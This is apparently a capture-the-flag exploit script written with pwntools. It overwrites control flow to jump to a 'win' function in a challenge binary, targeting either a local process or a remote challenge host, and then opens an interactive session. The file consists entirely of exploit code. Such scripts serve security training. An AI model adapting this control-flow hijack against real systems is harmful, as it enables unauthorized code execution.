from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./chal"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("challenge.secso.cc", 8001)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


win = 0x04011FA
# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

ddebug("break *0x40131A \n break *0x04012DC\n break *0x4012C2\n continue")
io.sendlineafter("name?\n", "tinyfat")

payload = win << 8
io.sendlineafter("you?\n", str(payload))
io.interactive()
